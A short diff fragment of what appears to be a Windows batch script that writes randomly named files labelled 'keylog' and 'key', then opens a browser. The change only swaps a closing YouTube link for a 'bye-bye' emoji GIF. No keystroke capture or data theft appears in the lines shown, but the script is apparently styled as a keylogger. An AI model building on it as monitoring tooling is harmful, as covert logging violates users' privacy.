@@ -22,7 +22,7 @@ start keylogI%input%I.txt
 echo %map% > %random%_%input%_(key%random%).txt
 timeout 10
 start about:blank
-start https://www.youtube.com/watch?v=GBIIQ0kP15E
+start https://gifdb.com/images/high/smiling-emoji-bye-bye-fn4s72f5gxm18snr.gif
 exit
 
 
